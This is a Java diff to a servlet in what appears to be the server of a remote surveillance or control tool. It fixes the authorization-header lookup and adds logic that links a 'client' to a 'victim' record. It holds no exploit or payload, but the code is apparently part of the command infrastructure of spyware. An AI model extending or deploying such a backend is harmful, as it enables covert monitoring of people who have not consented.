@@ -3,6 +3,7 @@ package com.theah64.xrob.api.servlets;
 import com.theah64.xrob.api.database.tables.ClientVictimRelations;
 import com.theah64.xrob.api.database.tables.Clients;
 import com.theah64.xrob.api.models.Client;
+import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.HeaderSecurity;
 import com.theah64.xrob.api.utils.Request;
 
@@ -26,20 +27,33 @@ public class ConnectClientToVictimServlet extends BaseServlet {
         response.setContentType(CONTENT_TYPE_JSON);
         final PrintWriter out = response.getWriter();
         try {
-            final HeaderSecurity hs = new HeaderSecurity(response.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
+            final HeaderSecurity hs = new HeaderSecurity(request.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
+            
             final Request connectRequest = new Request(request, REQUIRED_PARAMS);
 
             final String clientCode = connectRequest.getStringParameter(Clients.COLUMN_CLIENT_CODE);
             final String clientId = Clients.getInstance().get(Clients.COLUMN_CLIENT_CODE, clientCode, Clients.COLUMN_ID);
             if (clientId != null) {
                 final String victimId = hs.getVictimId();
-                final boolean isAlreadyConnected = ClientVictimRelations.getInstance().isConnected(clientId, victimId);
+                ClientVictimRelations cvr = ClientVictimRelations.getInstance();
+                final boolean isAlreadyConnected = cvr.isConnected(clientId, victimId);
+                if (!isAlreadyConnected) {
+                    final boolean isConnected = cvr.connect(clientId, victimId);
+                    if (isConnected) {
+                        out.write(new APIResponse("You're CONNECTED!", null).getResponse());
+                    } else {
+                        throw new Exception("Error while establishing the connection!");
+                    }
+                } else {
+                    throw new Exception("You're already connected to this victim");
+                }
             } else {
                 throw new Exception("Client doesn't exist with client code : " + clientCode);
             }
 
         } catch (Exception e) {
             e.printStackTrace();
+            out.write(new APIResponse(e.getMessage()).getResponse());
         }
         out.flush();
         out.close();
